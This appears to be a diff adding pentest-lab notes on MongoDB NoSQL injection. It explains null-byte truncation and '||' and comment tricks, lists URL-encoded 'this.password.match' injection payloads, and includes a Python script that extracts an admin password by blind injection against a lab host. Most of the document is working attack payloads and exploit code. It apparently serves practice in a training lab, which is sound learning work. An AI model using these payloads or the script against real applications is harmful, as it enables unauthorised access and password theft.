@@ -1,0 +1,41 @@
+___________________________________________________________________
+
+mongodb
+___________________________________________________________________
+
+#1
+
+first, by reading mongodb documentation you can find that the sql or 1=1 translates to || 1==1 (note the double =). then by poking around, you can see that a null byte will prevent mongodb from using the rest of the query. in some cases, you can also use the comments // or <!-- to comment out the end of the query.
+___________________________________________________________________
+
+#2
+
+/?search=admin'%20%26%26%20this.password.match(/.*/)%00
+/?search=admin'%20%26%26%20this.password.match(/zzzzz/)%00
+/?search=admin'%20%26%26%20this.passwordzz.match(/.*/)%00:
+
+blind injection
+
+###################################################################
+import requests
+
+# xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx, where x can be [0-9a-f]
+
+x = '-01234567890abcdef'
+payload=''
+
+while len(payload)!=36:
+	for i in x:
+		
+		url='http://ptl-8e00bff4-c65e2d45.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/^' + payload+i + '.*$/)%00'
+		
+		print(payload+i)
+
+		r = requests.get(url)
+		if '<tr><td><a href="?search=admin">admin</a></td></tr>' in r.text:
+			payload = payload+i
+			break
+
+print(payload)
+###################################################################
+___________________________________________________________________
